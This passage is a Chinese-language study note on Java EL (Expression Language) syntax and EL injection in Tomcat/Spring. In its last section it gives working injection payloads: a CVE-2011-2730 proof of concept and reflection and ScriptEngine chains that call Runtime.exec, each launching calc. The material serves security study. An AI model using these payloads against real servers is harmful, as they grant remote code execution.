

-  看 Tomcat JSP 中是否支持类似于 EL 这类具有动态执行能力的其他语法特性；
- 看 EL 表达式中是否支持某些特殊编码，利用特殊编码将要转义的字符进行编码来绕过；
- 看 EL 表达式中是否可能存在二次解析执行（类似于 Struts2 中之前表达式二次渲染注入的漏洞）；
-  在不使用圆括号的情况下，通过 EL 表达式的取值、赋值特性，获取到某些关键的 Tomcat 对象实例，修改它们的属性，造成危险的影响；
## EL语法
EL表达式的格式为`${EL表达式}`，当表达式变量不给定范围时，默认在page范围内查找，再依次再request、session、application范围查找
EL表达式基本可以理解为简化的JSP代码

###  `[]`与`.`
`[]`与`.`运算符用于存取数据，熟悉中有特殊字符的，比如`.`、`-`等

### 变量

|属性范围在EL中的名称|-|
|---|---|
|Page|PageScope|
|Request|RequestScope|
|Session|SessionScope|
|Application|ApplicationScope|

|文字|文字的值|
|---|---|
|Boolean|true 和 false|
|Integer|与 Java 类似。可以包含任何整数，例如 24、-45、567|
|Floating Point|与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567|
|String|任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。|
|Null|null|

#### 操作符
| 术语   | 定义                                                                                                                 |
| ------ | -------------------------------------------------------------------------------------------------------------------- |
| 算术型 | +、-（二元）、*、/、div、%、mod、-（一元）                                                                           |
| 逻辑型 | and、&&、or、双管道符、!、not                                                                                        |
| 关系型 | ==、eq、!=、ne、<、lt、>、gt、<=、le、>=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 |
| 空     | empty 空操作符是前缀操作，可用于确定值是否为空。                                                                     |
| 条件型 | A ?B :C。根据 A 赋值的结果来赋值 B 或 C。                                                                            |
|        |                                                                                                                      |
|        |                                                                                                                      |
#### 隐式对象
|术语|定义|
|---|---|
|pageContext|JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，`${pageContext.response}`为页面的响应对象赋值。|

|术语|定义|
|---|---|
|param|将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式`${param . name}`相当于 request.getParameter (name)。|
|paramValues|将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 `${paramvalues. name}` 相当于 request.getParamterValues(name)。|
|header|将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 `${header. name}` 相当于 request.getHeader(name)。|
|headerValues|将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式`${headerValues. name}`相当于 request.getHeaderValues(name)。|
|cookie|将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式`${cookie. name .value}`返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用`${headerValues. name}`表达式。|
|initParam|将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。|

|术语|定义|
|---|---|
|pageScope|将页面范围的变量名称映射到其值。例如，EL 表达式可以使用`${pageScope.objectName}`访问一个 JSP 中页面范围的对象，还可以使用`${pageScope .objectName. attributeName}`访问对象的属性。|
|requestScope|将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用`${requestScope. objectName}`访问一个 JSP 请求范围的对象，还可以使用`${requestScope. objectName. attributeName}`访问对象的属性。|
|sessionScope|将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：`${sessionScope. name}`|
|applicationScope|将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。|
### 函数
ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推
```
${ns:func(param1, param2, ...)}
```

### 调用java方法
JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用`类名:方法名()`的形式来调用该类方法即可

## EL表达式注入

### CVE-2011-2730
poc
```HTML
<spring:message text=
"${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message>
```

### 反射调用Runtime
```JAVA
import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

public class Test {
    public static void main(String[] args) {
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        // failed
        // String exp = "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')}";
        // ok
        String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}
```

### ScriptEngine调用JS引擎
```JAVA
${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
```